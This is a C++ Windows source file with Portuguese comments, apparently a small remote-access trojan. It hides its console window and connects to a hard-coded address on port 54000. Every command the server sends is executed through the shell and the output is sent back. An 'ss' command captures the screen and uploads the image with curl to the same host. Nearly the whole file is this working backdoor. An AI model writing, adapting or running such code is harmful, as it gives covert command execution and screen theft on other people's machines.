#include "pch.h"
#include <iostream>
#include <WS2tcpip.h>
#include <string>
#include <array>
#include <Windows.h>
#define STB_IMAGE_WRITE_IMPLEMENTATION
#include "stb_image_write.h"
#include <vector>

#pragma comment(lib, "ws2_32.lib")

#define ipAddress "192.168.0.47"

using namespace std;

void HideConsole()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void ShowConsole()
{
    ::ShowWindow(::GetConsoleWindow(), SW_SHOW);
}
void TakeScreenShot()
{
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    HGDIOBJ hOld = SelectObject(hdcMem, hBitmap);

    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    // Obter os dados do bitmap
    BITMAPINFOHEADER bmih;
    bmih.biSize = sizeof(BITMAPINFOHEADER);
    bmih.biWidth = width;
    bmih.biHeight = height;  // Menos indica que a imagem é orientada para cima
    bmih.biPlanes = 1;
    bmih.biBitCount = 32;
    bmih.biCompression = BI_RGB;
    bmih.biSizeImage = 0;
    bmih.biXPelsPerMeter = 0;
    bmih.biYPelsPerMeter = 0;
    bmih.biClrUsed = 0;
    bmih.biClrImportant = 0;

    // Obtém os dados do bitmap
    std::vector<uint8_t> bitmapData(width * height * 4);
    GetDIBits(hdcScreen, hBitmap, 0, height, bitmapData.data(), (BITMAPINFO*)&bmih, DIB_RGB_COLORS);

    // Libera recursos GDI
    SelectObject(hdcMem, hOld);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    // Salva a imagem em JPEG
    stbi_flip_vertically_on_write(1);  // Inverte verticalmente a imagem (necessário para o stb_image_write)
    stbi_write_jpg("screenshot.jpg", width, height, 4, bitmapData.data(), 100);

    
    // Limpar recursos
    SelectObject(hdcMem, hOld);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    

    std::cout << "Captura de tela salva como 'screenshot.jpg'" << std::endl;
}
std::string executeCommand(std::string command)
{
    cout << "Executing: " << command;
    if (command == "ss") {
        TakeScreenShot();
        command = "curl -T screenshot.jpg http://192.168.0.47:3000/screenshot.jpg";
        //return "Screenshot Saved";
    }
    std::string result = "";
    std::array<char, 128> buffer;
    FILE* pipe(_popen(command.c_str(), "r"));
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (!feof(pipe)) {
        if (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
            result += buffer.data();
        }
    }
    _pclose(pipe);
    //cout << "receiving: " << result;
    return result;
}

void main()
{
    HideConsole();
    
    int port = 54000;

    // Inicializa o WinSock
    WSADATA data;
    WORD ver = MAKEWORD(2, 2);
    int wsResult = WSAStartup(ver, &data);
    if (wsResult != 0)
    {
        cerr << "Não é possível iniciar o Winsock, erro " << wsResult << endl;
        return;
    }

    // Cria o socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET)
    {
        cerr << "Não é possível criar o socket, erro " << WSAGetLastError() << endl;
        WSACleanup();
        return;
    }

    // Preenche uma estrutura de dicas
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    inet_pton(AF_INET, ipAddress, &hint.sin_addr);

    // Conecta ao servidor
    int connectionResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
    if (connectionResult == SOCKET_ERROR)
    {
        cerr << "Não é possível conectar com o servidor, erro# " << WSAGetLastError() << endl;
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Envia "padaria"
    //send(sock, "padaria", 8, 0);
    // Recendo
    char buf[4096];
    ZeroMemory(buf, 4096);
    string in = "teste do servidor";
    while (true)
    {
        int bytesReceived = recv(sock, buf, 4096, 0);
        if (bytesReceived > 0)
        {
            string serverMsg(buf, 0, bytesReceived);
            cout << "Received from server: " << serverMsg << endl;
            string resultCmd = executeCommand(serverMsg);
            int sendResult = send(sock, resultCmd.c_str(), resultCmd.size(), 0);
        }
    }
    // Feche o socket
    closesocket(sock);
    // Feche o winsock
    WSACleanup();
}